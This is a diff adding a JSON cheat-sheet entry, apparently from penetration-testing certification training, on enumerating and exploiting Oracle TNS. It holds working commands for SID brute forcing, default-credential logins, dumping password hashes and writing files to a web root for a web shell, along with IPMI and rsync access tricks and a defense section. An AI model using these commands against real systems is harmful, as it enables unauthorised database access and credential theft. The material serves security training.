@@ -1,0 +1,108 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "oracle"
+  ],
+  "tools": [
+    "nmap",
+    "odat",
+    "sqlplus",
+    "curl"
+  ],
+  "tags": [
+    "oracle",
+    "tns",
+    "sid-brute"
+  ],
+  "category": "Enumeration",
+  "subcategory": "Oracle TNS",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 04: Footprinting",
+  "examples": [
+    {
+      "label": "sqlplus queries",
+      "command": "select table_name from all_tables;\nselect * from user_role_privs;"
+    },
+    {
+      "label": "Lab example",
+      "command": "./odat.py all -s 10.129.204.235"
+    }
+  ],
+  "notes": "Default creds: Oracle 9 CHANGE_ON_INSTALL, DBSNMP dbsnmp, scott/tiger. Webroots: Linux /var/www/html, Windows C:\\inetpub\\wwwroot.",
+  "references": [
+    {
+      "title": "ODAT",
+      "url": "https://github.com/quentinhardy/odat"
+    },
+    {
+      "title": "HTB Academy - Footprinting",
+      "url": "https://academy.hackthebox.com/module/details/112"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "oracle-tns-setup",
+      "rel": "prereq",
+      "note": "Install ODAT + Oracle client before attacking."
+    },
+    {
+      "id": "oracle-tns-file-upload",
+      "note": "Upload a file to the web root via UTL_FILE after gaining Oracle access",
+      "rel": "escalation"
+    }
+  ],
+  "id": "oracle-tns-enum",
+  "name": "Oracle TNS - Enumeration & Exploitation",
+  "command": "./odat.py all -s <ip>",
+  "description": "Enumerate Oracle: scan the listener, brute-force the SID, run ODAT for a full assessment, log in with sqlplus, and abuse utlfile to write a web shell.",
+  "steps": [
+    {
+      "label": "1. Scan + SID brute force",
+      "command": "sudo nmap -p1521 -sV 10.129.204.235 --open\nsudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute"
+    },
+    {
+      "label": "2. ODAT full assessment",
+      "command": "./odat.py all -s 10.129.204.235"
+    },
+    {
+      "label": "3. sqlplus login + query",
+      "command": "sqlplus scott/tiger@10.129.204.235/XE\nsqlplus scott/tiger@10.129.204.235/XE as sysdba\n# select name,password from sys.user$;"
+    },
+    {
+      "label": "4. Write a file to the webroot (utlfile)",
+      "command": "echo \"Oracle File Upload Test\" > testing.txt\n./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\\\inetpub\\\\wwwroot testing.txt ./testing.txt\ncurl -X GET http://10.129.204.235/testing.txt"
+    }
+  ],
+  "opsec": "moderate",
+  "mitre": [
+    "T1046"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Oracle services ship with well-known default credentials: Oracle 9 uses 'CHANGE_ON_INSTALL' as the default password, and the Oracle DBSNMP service uses 'dbsnmp'. These defaults are frequently left unchanged, giving attackers immediate access.",
+    "prerequisites": "Network access to the Oracle TNS listener (TCP 1521).",
+    "impact": "SID/service names and, via well-known default credentials, database access.",
+    "detection": "[MITRE T1046 AN1583] Monitor for execution of network enumeration utilities (nmap, netcat, net.exe, ping.exe, tracert.exe) in short succession, particularly when chained with lateral movement tools or system enumeration commands. [AN1584] Sequential ping, arp, or traceroute commands issued from bash scripts or interactive shells to map remote hosts are a strong behavioral indicator.",
+    "artifacts": "TNS listener connection and query entries in Oracle listener logs.",
+    "prevention": "Change all default Oracle passwords immediately after installation — SYS, SYSTEM, DBSNMP, and all other built-in accounts. Oracle includes a built-in encryption mechanism for data transmission; ensure it is enabled. Audit and lock/disable unused Oracle accounts.\n\n[MITRE T1046 M1042] Disable or remove unnecessary services and functionality that expose attack surface. [M1030] Implement network segmentation to limit the set of hosts reachable from any given compromised system. Use firewalls to restrict which source addresses can reach each service port.",
+    "sources": [
+      "HTB M04",
+      "MITRE T1046"
+    ],
+    "misconfiguration": "Services expose excessive information: version banners, supported auth methods, valid usernames via error responses. IPMI has no authentication (version 2.0 cipher 0 vulnerability). RSH/rexec trust .rhosts files. rsync shares readable anonymously. Oracle TNS allows remote poisoning in older versions.",
+    "vulnerable_config": "# IPMI cipher 0 — no authentication required:\n# ipmitool -H <ip> -U admin -P '' -I lanplus -C 0 chassis status\n# Returns valid data — auth bypassed entirely\n\n# rsync anonymous access:\n# rsync --list-only rsync://<ip>/  # lists all modules without auth\n# rsync rsync://<ip>/backup /tmp   # downloads backup files\n\n# Oracle TNS — version banner reveals exact version:\n# nmap -p 1521 -sV -> Oracle Database 11.2.0.4 (exact version)",
+    "secure_config": "# IPMI — disable cipher 0, enable only strong ciphers:\n# /etc/ipmi/ipmievd.conf: IPMI_CIPHER_SUITE=17  (AES, mandatory auth)\n# Or disable IPMI entirely if not needed (BMC IPMI = critical attack surface)\n\n# rsync — require auth:\n# /etc/rsyncd.conf:\n# [backup]\n#   auth users = backupuser\n#   secrets file = /etc/rsyncd.secrets\n#   hosts allow = 10.10.1.0/24\n\n# RSH/rexec — disable entirely (replaced by SSH):\nsystemctl disable rsh.socket rexec.socket rlogin.socket\n\n# Oracle TNS — disable remote admin, enforce auth:\n# sqlnet.ora: SQLNET.AUTHENTICATION_SERVICES = (BEQ, TCPS)  (not NONE)"
+  }
+}
